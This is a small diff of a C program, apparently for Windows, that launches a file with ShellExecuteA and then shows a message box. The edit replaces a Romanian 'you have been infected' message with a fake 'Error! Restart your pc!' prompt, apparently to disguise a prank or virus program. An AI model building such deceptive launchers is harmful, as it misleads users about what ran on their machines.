@@ -21,6 +21,6 @@ int main()
     ShellExecuteA(NULL,"open",path,NULL,NULL,SW_NORMAL);
 
 
-MessageBox(0,"Virusat","Ai fost Virusat",1);
+MessageBox(0,"Error!","Restart your pc!",1);
 return 0;
 }
